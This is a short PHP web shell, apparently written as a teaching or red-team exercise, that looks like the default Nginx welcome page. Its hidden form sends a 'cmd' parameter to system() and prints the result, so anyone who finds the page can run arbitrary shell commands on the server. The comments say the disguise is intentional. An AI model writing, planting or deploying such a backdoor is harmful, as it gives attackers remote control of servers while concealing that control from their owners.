<!DOCTYPE html>
<html> 
    <!-- Webshell by Stacey Zheng -->
    <!-- This tool disguises as an Nginx welcome page but includes a form that sends the text entered to this script and executes the user's input as a shell command. -->
    <head>
        <title>Welcome to nginx!</title>
        <style> /* CSS sets the color scheme, width, margin, and font family */
            html { color-scheme: light dark; }
            body { 
                width: 35em; 
                margin: 0 auto;
                font-family: Tahoma, Verdana, Arial, sans-serif;
            }
        </style>
    </head>
    <body> <!-- HTML Nginx welcome page -->
        <h1>Welcome to nginx!</h1>
        <p>If you see this page, the nginx web server is successfully installed and
        working. Further configuration is required.</p>

        <p>For online documentation and support please refer to
        <a href="http://nginx.org/">nginx.org</a>.<br/>
        Commercial support is available at
        <a href="http://docs.nginx.com/">nginx.com</a>.</p>

        <p><em>Thank you for using nginx.</em></p>

        <!-- The form submits to the same webshell.php script and gets webshell.php’s filename -->
        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="TEXT" name="cmd" autofocus id="cmd" size="30"> <!-- Text input field for the user --> 
            <input type="SUBMIT" value="Submit"> <!-- Submit button -->
        </form>
        <pre> <!-- PHP section where the output is shown --> 
            <?php 
                if(isset($_GET['cmd'])) { // If the 'txt' parameter is in the GET request,
                    system($_GET['cmd'] . ' 2>&1'); // run the command given and show the output
                    // The system() function executes the user's input as a shell command
                } // '2>&1' redirects error messages to standard output
            ?>
        </pre>
    </body>
</html>